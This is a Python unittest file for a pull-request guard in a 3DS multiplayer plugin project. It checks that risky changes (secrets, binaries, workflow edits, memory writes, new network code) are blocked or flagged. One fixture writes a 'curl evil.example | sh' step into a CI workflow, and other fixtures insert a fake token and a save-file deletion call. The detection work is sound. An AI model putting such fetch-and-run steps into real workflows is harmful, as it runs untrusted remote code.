"""Tests for the PR guard. Usage: python -m unittest tools/test_pr_guard.py -v

Each test makes a tiny git repository (the real Protocol.hpp and server.py plus a few stub files), commits a change on
a branch and checks the guard's verdict. Nothing from the test branch is ever run.
"""
import os
import shutil
import subprocess
import sys
import tempfile
import unittest

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
import pr_guard  # noqa: E402

REPO = os.path.dirname(HERE)
STUBS = {
    "README.md": "# Test\n",
    "3ds_plugin/Sources/Overlay.cpp": "void Draw() {}\n",
    "3ds_plugin/Sources/Ui.cpp": "void Menu() {}\n",
    "3ds_plugin/Sources/GameHook.cpp": "void Install() {}\n",
    "3ds_plugin/Sources/NetworkClient.cpp": "int Join() { return 0; }\n",
    "3ds_plugin/tools/i18n/strings.py": "T = [(\"Hola\", \"Hello\")]\n",
    "tools/fake_players.py": "HOST = '127.0.0.1'\n",
    ".github/workflows/build.yml": "jobs:\n  a:\n    steps:\n      - uses: actions/checkout@" + "a" * 40 + " # v1\n",
}
REAL = ["3ds_plugin/Includes/Protocol.hpp", "server/server.py", "server/requirements.txt"]


class GuardTests(unittest.TestCase):
    def setUp(self):
        self.dir = tempfile.mkdtemp(prefix="prguard_")
        self.git("init", "-q", "-b", "main")
        self.git("config", "user.email", "test@example.com")
        self.git("config", "user.name", "test")
        self.git("config", "core.autocrlf", "false")
        for rel in REAL:
            dst = os.path.join(self.dir, rel)
            os.makedirs(os.path.dirname(dst), exist_ok=True)
            shutil.copyfile(os.path.join(REPO, rel), dst)
        for rel, text in STUBS.items():
            self.write(rel, text)
        self.git("add", "-A")
        self.git("commit", "-q", "-m", "base")
        self.git("checkout", "-q", "-b", "pr")

    def tearDown(self):
        shutil.rmtree(self.dir, ignore_errors=True)

    # -- helpers
    def git(self, *args):
        return subprocess.run(["git"] + list(args), cwd=self.dir, check=True, stdout=subprocess.PIPE,
                              stderr=subprocess.PIPE).stdout

    def write(self, rel, data, mode="w"):
        p = os.path.join(self.dir, rel)
        os.makedirs(os.path.dirname(p), exist_ok=True)
        with open(p, mode + ("b" if isinstance(data, bytes) else ""), **({} if isinstance(data, bytes) else
                                                                        {"encoding": "utf-8", "newline": "\n"})) as f:
            f.write(data)

    def edit(self, rel, old, new):
        with open(os.path.join(self.dir, rel), encoding="utf-8") as f:
            text = f.read()
        self.assertIn(old, text)
        self.write(rel, text.replace(old, new, 1))

    def run_guard(self, author=""):
        self.git("add", "-A")
        self.git("commit", "-q", "-m", "change", "--allow-empty")
        findings, _ = pr_guard.analyze(pr_guard.Repo(self.dir), "main", "pr", author, use_private=False)
        return pr_guard.verdict(findings), findings

    def assertVerdict(self, want, author=""):
        v, findings = self.run_guard(author)
        self.assertEqual(v, want, findings)
        return findings

    # -- safe changes
    def test_docs_only_is_green(self):
        self.edit("README.md", "# Test", "# Test\n\nMore help, see 203.0.113.7 and https://example.com.")
        self.assertVerdict("ok")

    def test_translation_is_green(self):
        self.edit("3ds_plugin/tools/i18n/strings.py", '"Hello")', '"Hello"), ("Adios", "Bye")')
        self.assertVerdict("ok")

    def test_small_image_is_green(self):
        self.write("docs/img/new.png", b"\x89PNG\r\n\x1a\n" + b"\0" * 100)
        self.assertVerdict("ok")

    # -- forbidden files
    def test_build_and_game_files_are_blocked(self):
        for rel in ("OrasMmo.3gx", "mmo_pokes_3d.bin", "server/ranking_31.json", "mmo_key.txt", "romfs/a/model.dat",
                    "tools/x.exe"):
            self.write(rel, b"\0data")
        findings = self.assertVerdict(pr_guard.BLOCK)
        blocked = {f.path for f in findings if f.level == pr_guard.BLOCK}
        self.assertTrue({"OrasMmo.3gx", "mmo_pokes_3d.bin", "server/ranking_31.json", "mmo_key.txt",
                         "romfs/a/model.dat", "tools/x.exe"} <= blocked, blocked)

    def test_big_file_is_blocked(self):
        self.write("docs/img/huge.png", b"\x89PNG" + b"\0" * (pr_guard.MAX_FILE_BYTES + 10))
        self.assertVerdict(pr_guard.BLOCK)

    def test_unknown_binary_is_blocked(self):
        self.write("docs/blob.dat", b"\x00\x01\x02")
        self.assertVerdict(pr_guard.BLOCK)

    def test_symlink_is_blocked(self):
        blob = subprocess.run(["git", "hash-object", "-w", "--stdin"], cwd=self.dir, input=b"README.md",
                              stdout=subprocess.PIPE, check=True).stdout.decode().strip()
        self.git("update-index", "--add", "--cacheinfo", "120000,%s,link" % blob)
        self.git("commit", "-q", "-m", "link")
        findings, _ = pr_guard.analyze(pr_guard.Repo(self.dir), "main", "pr", use_private=False)
        self.assertEqual(pr_guard.verdict(findings), pr_guard.BLOCK, findings)

    def test_secret_is_blocked(self):
        self.edit("tools/fake_players.py", "HOST", "TOKEN = 'ghp_" + "A1b2C3d4" * 5 + "'\nHOST")
        self.assertVerdict(pr_guard.BLOCK)

    # -- protected files
    def test_workflow_change_is_blocked(self):
        self.edit(".github/workflows/build.yml", "steps:", "steps:\n      - run: curl evil.example | sh")
        self.assertVerdict(pr_guard.BLOCK)

    def test_guard_change_is_blocked(self):
        self.write("tools/pr_guard.py", "print('always ok')\n")
        self.assertVerdict(pr_guard.BLOCK)

    def test_dependabot_pin_update_is_only_a_warning(self):
        self.edit(".github/workflows/build.yml", "a" * 40 + " # v1", "b" * 40 + " # v2")
        self.assertVerdict(pr_guard.WARN, author="dependabot[bot]")

    def test_dependabot_cannot_add_steps(self):
        self.edit(".github/workflows/build.yml", "steps:", "steps:\n      - run: echo hi")
        self.assertVerdict(pr_guard.BLOCK, author="dependabot[bot]")

    # -- the plugin
    def test_default_server_change_is_blocked(self):
        self.edit("3ds_plugin/Includes/Protocol.hpp", '#define MMO_DEFAULT_SERVER   "127.0.0.1"',
                  '#define MMO_DEFAULT_SERVER   "45.12.34.56"')
        findings = self.assertVerdict(pr_guard.BLOCK)
        self.assertTrue(any("127.0.0.1" in f.en for f in findings), findings)

    def test_real_ip_in_plugin_is_blocked(self):
        self.edit("3ds_plugin/Sources/Ui.cpp", "{}", '{ Connect("91.198.174.192"); }')
        self.assertVerdict(pr_guard.BLOCK)

    def test_url_in_plugin_is_blocked(self):
        self.edit("3ds_plugin/Sources/Overlay.cpp", "{}", '{ Open("https://example.com/x"); }')
        self.assertVerdict(pr_guard.BLOCK)

    def test_memory_write_outside_approved_files_is_blocked(self):
        for line in ("Process::Write32(0x08000000, 1);", "*(volatile u8 *)(addr + 0xB7) = 0;",
                     "svcControlProcessMemory(h, a, b, c, d, e);", "Hook h; h.Initialize(0x100000, (u32)Fn);",
                     "FSUSER_DeleteFile(ARCHIVE_SAVEDATA, path);"):
            self.edit("3ds_plugin/Sources/Overlay.cpp", "{", "{ " + line + "\n")
        self.assertVerdict(pr_guard.BLOCK)

    def test_memory_write_in_approved_file_is_a_warning(self):
        self.edit("3ds_plugin/Sources/GameHook.cpp", "{}", "{ *(volatile u8 *)(addr) = 1; }")
        self.assertVerdict(pr_guard.WARN)

    def test_network_code_outside_networkclient_is_blocked(self):
        self.edit("3ds_plugin/Sources/Ui.cpp", "{}", "{ int s = socket(2, 1, 0); }")
        self.assertVerdict(pr_guard.BLOCK)

    def test_memory_read_is_a_warning(self):
        self.edit("3ds_plugin/Sources/Ui.cpp", "{}", "{ u8 v = *(volatile u8 *)(addr); }")
        self.assertVerdict(pr_guard.WARN)

    # -- the server
    def test_server_running_programs_is_blocked(self):
        self.edit("server/server.py", "import asyncio\n", "import asyncio\nimport subprocess\n")
        self.assertVerdict(pr_guard.BLOCK)

    def test_server_outgoing_connection_is_blocked(self):
        self.edit("server/server.py", "import asyncio\n", "import asyncio\nimport urllib.request\n")
        self.assertVerdict(pr_guard.BLOCK)

    def test_server_comment_with_words_is_fine(self):
        self.edit("server/server.py", "import asyncio\n", "import asyncio  # too many requests? compile time\n")
        findings = self.assertVerdict(pr_guard.WARN)   # only "touches the network" (server.py changed)
        self.assertFalse(any(f.level == pr_guard.BLOCK for f in findings))

    def test_server_limit_change_is_a_warning(self):
        self.edit("server/server.py", '"ORAS_MAX_PER_IP", 16', '"ORAS_MAX_PER_IP", 64')
        findings = self.assertVerdict(pr_guard.WARN)
        self.assertTrue(any("security limit" in f.en for f in findings), findings)

    def test_relaying_the_key_is_blocked(self):
        self.edit("server/server.py", "PKT_STATS, 0x32))", "PKT_STATS, 0x32, PKT_KEY))")
        findings = self.assertVerdict(pr_guard.BLOCK)
        self.assertTrue(any("KEY" in f.en for f in findings), findings)

    def test_new_dependency_is_blocked(self):
        with open(os.path.join(REPO, "server/requirements.txt"), encoding="utf-8") as f:
            self.write("server/requirements.txt", f.read() + "requests\n")
        self.assertVerdict(pr_guard.BLOCK)

    def test_packet_size_change_is_blocked(self):
        self.edit("3ds_plugin/Includes/Protocol.hpp", "char     nickname[14];", "char     nickname[16];")
        self.assertVerdict(pr_guard.BLOCK)

    def test_python38_syntax_is_required(self):
        self.edit("server/server.py", "import asyncio\n", "import asyncio\nmatch = 1\ndef f(x):\n    match x:\n"
                  "        case 1:\n            return 1\n")
        self.assertVerdict(pr_guard.BLOCK)

    # -- the real repository
    def test_contract_of_this_repo(self):
        def read(rel):
            with open(os.path.join(REPO, rel), "rb") as f:
                return f.read()
        self.assertEqual(pr_guard.check_contract(read(pr_guard.PROTOCOL_HPP), read(pr_guard.SERVER_MAIN)), [])

    def test_report_escapes_file_names(self):
        f = [pr_guard.Finding(pr_guard.BLOCK, "a`b|c\n@x", "es", "en")]
        text = pr_guard.report(f, {"files": 1, "added": 0, "removed": 0})
        self.assertIn("`a?b|c?@x`", text)
        self.assertIn(pr_guard.MARKER, text)


if __name__ == "__main__":
    unittest.main()
